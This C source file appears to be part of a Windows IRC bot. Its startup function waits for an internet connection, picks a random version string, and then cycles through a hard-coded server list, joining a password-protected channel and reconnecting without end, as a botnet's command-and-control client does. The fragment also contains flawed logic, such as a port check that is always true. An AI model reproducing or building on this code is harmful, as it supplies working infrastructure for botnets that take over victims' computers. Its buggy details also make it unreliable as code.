#include "includes.h"
#include "externs.h"

int XIRCStartup()
{
	#ifdef DEBUG_SYSTEM
	dbg("XIRCStartup(), Started");
	#endif

	memset(&threads, 0, sizeof(threads));
	
	int Ret;

	MainStruct.Active = TRUE;


		if (!XWStartup())
		{
			Sleep(60*1000*1000);

		}

	#ifdef DEBUG_SYSTEM
	dbg("first loop passed, %d", MainStruct.VersionListSize);
	#endif

	CurrentVersion = rand()%MainStruct.VersionListSize/2;

	#ifdef DEBUG_SYSTEM
	dbg("CurrentVersion: %d:%s", CurrentVersion, VersionList[CurrentVersion]);
	#endif


//	while (1)
	{
		HMODULE wininet_dll = GetModuleHandle("wininet.dll");
		if (!wininet_dll)
			wininet_dll = LoadLibrary("wininet.dll");
		if (wininet_dll)
		{
			typedef BOOL (__stdcall *IGCS)(LPDWORD, DWORD);
			IGCS fInternetGetConnectedState;
			fInternetGetConnectedState = (IGCS)GetProcAddress(wininet_dll, "InternetGetConnectedState");

			while (MainStruct.Active)
			{
				if (!fInternetGetConnectedState(NULL, 0))
				{
			//		MessageBox(0, "No Internet Connection", "Internet", 0);
					Sleep(30000);
					continue;
				}
				else
					break;
			}
				//MessageBox(0, "Found Internet Connection", "Internet", 0);
			FreeLibrary(wininet_dll); //////////////////////////////////////////////////////////////////////////////////////////////
		}
	}

	#ifdef DEBUG_SYSTEM
	dbg("second loop passed");
	#endif

	memset(&MainIrc, 0, sizeof(MainIrc));
	MainStruct.CurrentMainServer = 0;

	while (MainStruct.Active)
	{
		#ifdef DEBUG_SYSTEM
		dbg("~~%s:%d", ServerList[MainStruct.CurrentMainServer].Server, MainStruct.ServerListSize);
		#endif

		if (!ServerList[MainStruct.CurrentMainServer].Server)// || !!servers[MainStruct.CurrentMainServer].Port)
			MainStruct.CurrentMainServer = 0;

		#ifdef DEBUG_SYSTEM
		dbg("CurrentServer:[%d]:%s:%d", MainStruct.CurrentMainServer, ServerList[MainStruct.CurrentMainServer].Server, ServerList[MainStruct.CurrentMainServer].Port);
		#endif

		strncpy(MainIrc.Server, ServerList[MainStruct.CurrentMainServer].Server, sizeof(MainIrc.Server)-1);
		MainIrc.Port = (ServerList[MainStruct.CurrentMainServer].Port > 0 || ServerList[MainStruct.CurrentMainServer].Port <= 65535)?(ServerList[MainStruct.CurrentMainServer].Port):(6667);
		strncpy(MainIrc.Channel, ServerList[MainStruct.CurrentMainServer].Channel, sizeof(MainIrc.Channel)-1);
		strncpy(MainIrc.ChannelPass, ServerList[MainStruct.CurrentMainServer].ChannelPass, sizeof(MainIrc.ChannelPass)-1);
		strncpy(MainIrc.UserMode, ServerList[MainStruct.CurrentMainServer].UserMode, sizeof(MainIrc.UserMode)-1);
		strncpy(MainIrc.ChannelMode, ServerList[MainStruct.CurrentMainServer].ChannelMode, sizeof(MainIrc.ChannelMode)-1);

		for (int i = 0; i < MAXRET-1; i++)
		{
			#ifdef DEBUG_SYSTEM
			dbg("[%d][%d] Connecting to: %s:%d", i, MAXRET, MainIrc.Server, MainIrc.Port);
			#endif

			Ret = XIRCConnect(&MainIrc);

			#ifdef DEBUG_SYSTEM
			dbg("IRCConnect RET: %d", Ret);
			#endif

		}
		memset(&MainIrc, 0, sizeof(MainIrc));
		MainStruct.CurrentMainServer++;

		#ifdef DEBUG_SYSTEM
		dbg("break, ++");
		#endif

		Sleep(10*1000*1000);

//		system("pause");
	}


	// cleanup;
//	killthreadall();
	WSACleanup();

	return 0;

}
